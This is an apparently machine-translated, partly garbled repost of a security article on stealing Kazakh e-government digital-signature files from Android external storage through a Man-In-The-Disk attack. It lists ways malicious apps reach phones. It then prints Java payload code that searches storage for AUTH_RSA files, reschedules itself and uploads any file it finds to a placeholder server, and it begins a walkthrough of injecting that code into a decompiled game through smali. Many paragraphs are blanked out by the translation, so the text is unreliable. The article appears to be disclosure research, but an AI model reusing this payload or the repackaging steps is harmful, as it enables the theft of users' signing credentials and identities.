<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>💃🏻 🚙 🦁 Man-In-The-Diskを使用したEDSの盗用 🙆🏻 🐵 👦🏻</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="カザフスタンのモバイルアプリケーションmEGOVとENPFは、認証方法の1つとして電子署名を使用しています。この方法でログインするには、ファイルをデジタル署名から電話に転送する必要があります。この認証方法は、Man-In-The-Disk攻撃に対して脆弱です（これについては、以下で詳しく説明します）...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Man-In-The-Diskを使用したEDSの盗用</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/460993/"><p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">カザフスタンのモバイルアプリケーション</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mEGOV</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ENPF</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">は、認証方法の1つとして電子署名を使用しています。</font><font style="vertical-align: inherit;">この方法でログインするには、ファイルをデジタル署名から電話に転送する必要があります。</font><font style="vertical-align: inherit;">この認証方法は、Man-In-The-Disk攻撃に対して脆弱です（これについては、以下で詳しく説明します）。</font><font style="vertical-align: inherit;">攻撃の被害者になるには、攻撃者によって密かに変更されたお気に入りのアプリケーションをインストールする必要があります。</font><font style="vertical-align: inherit;">これを行う方法を示します。</font><font style="vertical-align: inherit;">まず、そのようなアプリケーションがユーザーに到達する方法を見つけます。</font></font><a name="habracut"></a></p><br>
<h2 id="kak-vredonosnye-prilozheniya-popadayut-na-telefon"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">悪意のあるアプリケーションが電話に侵入する方法</font></font></h2><br>
<h3 id="lokalnye-markety-prilozheniy-kitaya-irana-i-td"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中国、イランなどの現地応用市場</font></font></h3><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例：cafebazaar.ir、android.myapp.com、apkplz.net</font></font></p><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これらのサイトは、Googleアプリケーションや公式アプリケーションのサーバーの検閲とブロックにより表示されました。通常、人気のあるアプリケーションのローカルアナログとその変更が含まれています。このような変更（</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">このイランの電報の</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ような</font><font style="vertical-align: inherit;">）には、おそらく新しいクールな機能が含まれています。そのようなアプリケーションの危険性は何ですか？あなたは彼らが実際に何をしているのか決して知りません。さらに、一部の政府は、ユーザーを追跡するためのツールを使用して、機会を逃さず、変更を公開しています。政府の監視アプリケーションは本質的に悪意があります。かつて、</font><font style="vertical-align: inherit;">電話をスキャンして電報のクローンを</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">探す</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">悪意のあるアプリケーション（</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">Virustotalの結果</font></a><font style="vertical-align: inherit;">、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ここ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">に</font><font style="vertical-align: inherit;">サンプル</font><font style="vertical-align: inherit;">、パスワード：感染）</font><font style="vertical-align: inherit;">を調べました</font><font style="vertical-align: inherit;">。</font></font></p><br>
<pre><code class="plaintext hljs">  "com.hanista.mobogram"<font></font>
  "org.ir.talaeii"<font></font>
  "ir.hotgram.mobile.android"<font></font>
  "ir.avageram.com"<font></font>
  "org.thunderdog.challegram"<font></font>
  "ir.persianfox.messenger"<font></font>
  "com.telegram.hame.mohamad"<font></font>
  "com.luxturtelegram.black"<font></font>
  "com.talla.tgr"<font></font>
  "com.mehrdad.blacktelegram"</code></pre><br>
<p>         .   ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>,      ,     <em>Cafebazaar</em>,  .  :</p><br>
<blockquote>This looks to be developed to the specifications of the Iranian government enabling them to track every bit and byte put forward by users of the app. </blockquote><p>    ?: (<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>)</p><br>
<p><img src="https://habrastorage.org/webt/bg/l2/k1/bgl2k1slpn6zgcegcnwmvssgo_o.png" alt="画像"></p><br>
<p>      ,      —    ,   .       ,    ,      Google     Play Market,  ,      .        Google,    .</p><br>
<p>    ,   <em>Tencent My App</em>,  260 .    (<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>)</p><br>
<p><img src="https://habrastorage.org/webt/kb/cy/_4/kbcy_4bdvjpqe0m7flp9kvuhqlm.png" alt="画像"></p><br>
<p> ,     /,       SDK ( )   ,  .   .…          ,    ,    ,      .       ,    ,    ,    . ,       IMEI,      .         IMEI     SD    .       ,      ,     IMEI,          .       Baidu  Salmonads.      <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>. </p><br>
<h3 id="fishing"></h3><br>
<p> ,       <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">  </a>.    ,    ,      ,     ,   ",     ".      . ,  Whatsapp/Telegram,      ...</p><br>
<p><img src="https://habrastorage.org/webt/r6/tc/l7/r6tcl7dsdaqv4q-smmh2v-_67tk.png" alt="画像"></p><br>
<p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">,  19.</a></p><br>
<p> ,     :</p><br>
<p><img src="https://habrastorage.org/webt/hy/zy/os/hyzyosiig_lrebvyhsw38am4m8o.png" alt="画像"></p><br>
<p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">, . 22</a></p><br>
<p>     </p><br>
<p><img src="https://habrastorage.org/webt/v9/8q/m1/v98qm1pkrd2mt90zrmjktwwow60.png" alt="画像"></p><br>
<p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a></p><br>
<h3 id="telegram-botygruppy"> /</h3><br>
<p>: @apkdl_bot, t.me/fun_android</p><br>
<p>  ,   apk .   ,    .      " ".    —    / ,    "Instagram",        Google Play, ,   ,     .    ,        .</p><br>
<h3 id="storonnie-sayty-posredniki"> -</h3><br>
<p>: apkpure.com, apkmirror.com, apps.evozi.com/apk-downloader/</p><br>
<p>    ,    .        ,    .    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a>:</p><br>
<p><img src="https://habrastorage.org/webt/om/sb/lt/omsblt9mpidhrw9zljs0ejexlmc.png" alt="画像"></p><br>
<p>   ,     (<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>):</p><br>
<p><img src="https://habrastorage.org/webt/zb/n3/te/zbn3tewawcdn0cyfilfmwzqo4wg.jpeg" alt="画像"></p><br>
<p> ,   ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Android Security Report 2018</a> — 1.6   Google Play Protect    Google Play.     .<br>
   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>,   ,   .<br>
    ,     ,    ,    :</p><br>
<p><img src="https://habrastorage.org/webt/dh/il/oh/dhilohxhl2btapm67zmyt68drb0.png" alt="画像"></p><br>
<p><img src="https://habrastorage.org/webt/fe/yv/si/feyvsif5ius3rfkc7dhxayt9onw.png" alt="画像"></p><br>
<h3 id="google-play">Google play</h3><br>
<p>      ,   Google Play Protect,        .        ,   ,   ,        .    ,     ,    ?  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>,   Google Play.</p><br>
<p>     <em>google play services</em>   ,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">  </a>.     .             — .   ,         .   ,   ,    ("L"  "I", "g"  "q"),  ,    , :</p><br>
<p><img src="https://habrastorage.org/webt/ns/da/fa/nsdafar3chowitbxqf_k0lsmiki.png" alt="画像"></p><br>
<p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>. </p><br>
<h3 id="drugie-sposoby"> </h3><br>
<ol>
<li><p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">   </a></p><br>
</li>
<li><p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">  </a></p><br>
</li>
<li><p>     USB,    . </p><br>
</li>
<li><p>      ,       Google Play. </p><br>
</li>
<li><p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a></p><br>
</li>
<li><p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">    .   </a></p><br>
</li>
<li><p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Watering hole attack</a></p><br>
</li>
<li><p>     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">   </a></p><br>
</li>
</ol><br>
<blockquote>The particular version appearing on Fire TV devices installs itself as an app called “Test” with the package name “com.google.time.timer”. Once it infects an Android device, it begins to use the device’s resources to mine cryptocurrencies and attempts to spread itself to other Android devices on the same network.</blockquote><br>
<h2 id="kak-zloumyshlenniki-zarazhayut-android-prilozheniya">    </h2><br>
<p>  ,         .   ,       .          <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Fruit Ninja</a>.    ,         (root   ). </p><br>
<h3 id="chto-takoe-man-in-the-disk">  Man-In-The-Disk?</h3><br>
<p>      ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>. ,  ,  .</p><br>
<p><em>   ,    —     ,         ,    </em></p><br>
<p>  ,  .  ,   .  ,   ,   Internal Storage  External Storage. Internal storage —    ,      .                 .    . External storage —   ,    (   SD ).   ?   .  ,    ,      . ,       internal storage,  ,       .  ,        Downloads.</p><br>
<p>       ,   .       .    ,          .   — READ_EXTERNAL_STORAGE.         ,        .    ,   ""   .         .      external storage    Man-In-The-Disk. ,  ,  — INTERNET.    ,       .  ,           .           .</p><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">私は上位15のカザフスタンのアプリケーションをダウンロードし、</font><font style="vertical-align: inherit;">要求された権限の統計を表示</font><font style="vertical-align: inherit;">する</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">スクリプト</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を</font><font style="vertical-align: inherit;">書きました</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">ご覧のとおり、READ_EXTERNAL_STORAGE、WRITE_EXTERNAL_STORAGE、およびINTERNETは非常に人気があります。</font><font style="vertical-align: inherit;">つまり、攻撃者はほとんどのアプリケーションでデジタル署名を盗むコードを簡単に埋め込むことができます。</font></font></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 テスト済みアプリケーションのリスト</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 2-GIS、AliExpress、Chocofood、Chrome、InDriver、Instagram、Kaspi、Kolesa、Krisha、Telegram、VK、WhatsApp、Yandex Music、Yandex Taxi </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
、Zakon KZ</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/hz/sj/uj/hzsjujj6x9k57felsqehjr7m0za.png" alt="画像"></p><br>
<p>E  whatsapp   ,        .  whatsapp      ,   "" .  ,  external storage, whatsapp  SSLSessionCache (File-based cache of established SSL sessions).  ,  ,     ,    . </p><br>
<p>        .     ,       ,       .</p><br>
<p><img src="https://habrastorage.org/webt/ey/jb/ol/eyjbolqxrjqp3ewfjbpkzldufw0.png" alt="画像"></p><br>
<p> mEGOV  ENPF, ,     External Storage:</p><br>
<p><img src="https://habrastorage.org/webt/7v/h1/r5/7vh1r51l1hodhonpnnt06xifsxw.png" alt="画像"></p><br>
<p><img src="https://habrastorage.org/webt/dh/q0/jr/dhq0jrc0gdwghwvbuynga8jzvjk.png" alt="画像"></p><br>
<p>Google     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a> READ_EXTERNAL_STORAGE  Android Q. :</p><br>
<blockquote>In order to access any other file that another app has created, including files in a "downloads" directory, your app must use the Storage Access Framework, which allows the user to select a specific file. </blockquote><br>
<h2 id="sozdaem-payload"> payload</h2><br>
<p>    .       : <code>StageAttack</code>, <code>MaliciousService</code>, <code>MaliciousTaskManager</code>. </p><br>
<p><img src="https://habrastorage.org/webt/wh/ru/wy/whruwyym3bmbuogp7apjivk3gm4.png" alt="画像"></p><br>
<p><code>StageAttack</code> —     ,    .      ,      .</p><br>
<pre><code class="java hljs"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StageAttack</span> </span>{<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">pwn</span><span class="hljs-params">(Context ctx)</span> </span>{<font></font>
        Intent intent = <span class="hljs-keyword">new</span> Intent(ctx,  MaliciousService.class);<font></font>
        ctx.startService(intent);<font></font>
    }<font></font>
}</code></pre><br>
<p><code>MaliciousService</code> — ,       external storage.</p><br>
<pre><code class="java hljs"><span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">pwn2</span><span class="hljs-params">(File dir)</span> </span>{<font></font>
<font></font>
    String path = <span class="hljs-keyword">null</span>;<font></font>
    File[] list = dir.listFiles();<font></font>
<font></font>
    <span class="hljs-keyword">for</span> (File f : list) {<font></font>
<font></font>
        <span class="hljs-keyword">if</span> (f.isDirectory()) {<font></font>
        path = pwn2(f);<font></font>
        <span class="hljs-keyword">if</span> (path != <span class="hljs-keyword">null</span>)
            <span class="hljs-keyword">return</span> path;<font></font>
        } <span class="hljs-keyword">else</span> {<font></font>
        path = f.getAbsolutePath();<font></font>
        <span class="hljs-keyword">if</span> (path.contains(<span class="hljs-string">"AUTH_RSA"</span>)) {<font></font>
            Log.d(TAG, <span class="hljs-string">"AUTH_RSA found here - "</span> + path);
            <span class="hljs-keyword">return</span> path;<font></font>
        }<font></font>
        }<font></font>
    }<font></font>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<font></font>
}</code></pre><br>
<p>   ,      5 ,   .    .    ,      .    ,        . Foreground service     ,        .    ,    ,     ,      .    ,  .         (JobService, WorkManager, setRepeating() AlarmManager').    ,        15         .    ,     <code>AlarmManager</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、メソッド</font></font><code>setExactAndAllowWhileIdle()</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">タスクが完了したら、同じ間隔で再計画します。</font><font style="vertical-align: inherit;">これは、現在私が知っている中で最も精度の高い唯一の方法です。</font></font></p><br>
<pre><code class="java hljs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">scheduleMalService</span><span class="hljs-params">()</span> </span>{<font></font>
<font></font>
        Context ctx = getApplicationContext();<font></font>
        AlarmManager alarmMgr = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);<font></font>
        Intent intent = <span class="hljs-keyword">new</span> Intent(ctx, MaliciousTaskManager.class);<font></font>
<font></font>
        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> _id = (<span class="hljs-keyword">int</span>) System.currentTimeMillis();<font></font>
        PendingIntent alarmIntent = PendingIntent.getBroadcast(ctx, _id, intent, <span class="hljs-number">0</span>);<font></font>
<font></font>
        alarmMgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() <font></font>
        + <span class="hljs-number">5000</span>, alarmIntent);<font></font>
    }</code></pre><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EDSが見つかった場合、ファイルをサーバーに送信します。</font></font></p><br>
<pre><code class="java hljs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sendToServer</span><span class="hljs-params">(String path)</span> </span>{<font></font>
    File file = <span class="hljs-keyword">new</span> File(path);<font></font>
    URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">"http://xxxxxxxxxx"</span>);<font></font>
    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();<font></font>
    urlConnection.setConnectTimeout(<span class="hljs-number">30</span> * <span class="hljs-number">1000</span>);<font></font>
<font></font>
    urlConnection.setRequestMethod(<span class="hljs-string">"POST"</span>);<font></font>
    urlConnection.setDoOutput(<span class="hljs-keyword">true</span>);<font></font>
    urlConnection.setRequestProperty(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/octet-stream"</span>);<font></font>
<font></font>
    DataOutputStream request = <span class="hljs-keyword">new</span> DataOutputStream(urlConnection.getOutputStream());<font></font>
    request.write(readFileToByteArray(file));<font></font>
    request.flush();<font></font>
    request.close();<font></font>
<font></font>
    <span class="hljs-keyword">int</span> respCode = urlConnection.getResponseCode();<font></font>
    Log.d(TAG, <span class="hljs-string">"Return status code: "</span> + respCode);<font></font>
}</code></pre><br>
<h2 id="vnedryaem-payload"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ペイロードを紹介します</font></font></h2><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">まず、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apktool</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を使用してFruit Ninjaを逆コンパイルし</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">ます</font></a><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">Javaコードの前にアプリケーションを逆コンパイルすることはありません。変更後は、アセンブルできなくなるためです。</font><font style="vertical-align: inherit;">正確にsmaliクラスを取得する必要があります。</font><font style="vertical-align: inherit;">また、コードをsmaliコードの形式で実装します。</font></font></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 smaliコードとは何ですか？</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Androidアプリケーションはバイトコードにコンパイルされ、Dalvik仮想マシンによって実行されます。</font><font style="vertical-align: inherit;">バイトコード自体は読みにくいため、人間が読める形式はsmaliと呼ばれます。</font><font style="vertical-align: inherit;">smaliはアセンブリ言語のアナログですが、Android向けです。</font></font><br>
<br>
<p>,   ,   payload    ,     .    GUI   - Activity,   ACTION_MAIN.     ,      AndroidManifest.xml:</p><br>
<pre><code class="java hljs">&lt;activity android:name=<span class="hljs-string">"com.halfbrick.mortar.MortarGameLauncherActivity"</span>&gt;<font></font>
    &lt;intent-filter&gt;<font></font>
        &lt;action android:name=<span class="hljs-string">"android.intent.action.MAIN"</span>/&gt;<font></font>
        &lt;category android:name=<span class="hljs-string">"android.intent.category.LAUNCHER"</span>/&gt;<font></font>
    &lt;/intent-filter&gt;<font></font>
&lt;/activity&gt;</code></pre><br>
<p>     <code>com.halfbrick.mortar.MortarGameLauncherActivity</code>.  ,   ,     Activity,   . </p><br>
<p><img src="https://habrastorage.org/webt/tz/nc/cz/tzncczehraigp6fvglv6dd5qfik.png" alt="画像"></p><br>
<p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a></p><br>
<p> Activity,       <em>base\smali_classes2\com\halfbrick\mortar\MortarGameLauncherActivity.smali</em>.       smali ,   ,     <strong></strong>   .</p><br>
<pre><code class="java hljs">.class <span class="hljs-keyword">public</span> Lcom/halfbrick/mortar/MortarGameLauncherActivity;<font></font>
//     <span class="hljs-keyword">package</span><font></font>
<font></font>
.<span class="hljs-keyword">super</span> Landroid/app/Activity;<font></font>
//.<span class="hljs-keyword">super</span>     . <font></font>
// Activity    android.app.Activity.<font></font>
<font></font>
.source "MortarGameLauncherActivity.java"<font></font>
//  Java .<font></font>
<font></font>
.method <span class="hljs-keyword">public</span> constructor &lt;init&gt;()V<font></font>
/*       -   . <font></font>
  ,    .<font></font>
  , V - <span class="hljs-keyword">void</span> */<font></font>
<font></font>
    .locals <span class="hljs-number">0</span>
<span class="hljs-comment">/*   Dalvik   ,   
 .    , 
    .    
   .    , 
    16, 256  64.  
     ,  .
      . 
   ,    .
.locals 0 - ,    0  . 
   ,  v0, v1, v2, v3, ... 
   - p0, p1, p2, p3. 
*/</span><font></font>
<font></font>
    .line <span class="hljs-number">28</span><font></font>
    invoke-direct {p0}, Landroid/app/Activity;-&gt;&lt;init&gt;()V<font></font>
<span class="hljs-comment">/* invoke-      .
invoke-direct -   ,   
. ,     java
- private  .    , 
      , 
 .      
 . p0 -    this  java.
init   ,     .
*/</span>
    <span class="hljs-keyword">return</span>-<span class="hljs-keyword">void</span>
<span class="hljs-comment">//   </span><font></font>
.end method<font></font>
<font></font>
.<span class="hljs-function">method <span class="hljs-keyword">protected</span> <span class="hljs-title">onStart</span><span class="hljs-params">()</span>V
    .locals 2

    .line 33
    invoke-<span class="hljs-keyword">super</span> </span>{p0}, Landroid/app/Activity;-&gt;onStart()V
<span class="hljs-comment">//  onStart()  </span><font></font>
<font></font>
    .line <span class="hljs-number">35</span><font></font>
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;-&gt;isTaskRoot()Z<font></font>
<span class="hljs-comment">/* invoke-virtual -   .     ,
    static, private, final  .  MortarGameLauncherActivity
   isTaskRoot(),        Activity. 
  Z - boolean */</span><font></font>
<font></font>
    move-result v0<font></font>
<span class="hljs-comment">/*    isTaskRoot()   v0. isTaskRoot()  
true,   Activity  ,   
  */</span><font></font>
<font></font>
    <span class="hljs-keyword">if</span>-nez v0, :cond_0
<span class="hljs-comment">/*  v0 = true,     cond_0 ( goto). 
 v0 = false,   
*/</span>
    .line <span class="hljs-number">37</span><font></font>
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;-&gt;finish()V<font></font>
<span class="hljs-comment">// finish()  Activity</span><font></font>
<font></font>
    <span class="hljs-keyword">return</span>-<span class="hljs-keyword">void</span>
<span class="hljs-comment">//   </span><font></font>
<font></font>
    .line <span class="hljs-number">41</span><font></font>
    :cond_0<font></font>
    <span class="hljs-keyword">new</span>-instance v0, Landroid/content/Intent;
<span class="hljs-comment">//   Intent        v0</span><font></font>
<font></font>
    <span class="hljs-keyword">const</span>-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">v1</span>, <span class="hljs-title">Lcom</span>/<span class="hljs-title">halfbrick</span>/<span class="hljs-title">mortar</span>/<span class="hljs-title">MortarGameActivity</span></span>;
<span class="hljs-comment">//    MortarGameActivity   v1. MortarGameActivity    Activity.</span><font></font>
<font></font>
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-&gt;&lt;init&gt;(Landroid/content/Context;Ljava/lang/Class;)V<font></font>
<span class="hljs-comment">//    Intent,  ,   </span><font></font>
<font></font>
    .line <span class="hljs-number">42</span><font></font>
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;-&gt;finish()V<font></font>
<span class="hljs-comment">//   Activity </span><font></font>
<font></font>
    .line <span class="hljs-number">43</span><font></font>
    invoke-virtual {p0, v0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;-&gt;startActivity(Landroid/content/Intent;)V<font></font>
<span class="hljs-comment">//  MortarGameActivity</span><font></font>
<font></font>
    <span class="hljs-keyword">return</span>-<span class="hljs-keyword">void</span>
.end method</code></pre><br>
<p>,  <code>MortarGameLauncherActivity</code>  <code>MortarGameActivity</code>  .  <code>MortarGameActivity</code>.     .   ,     <code>Oncreate</code>,       .       .     line,  .</p><br>
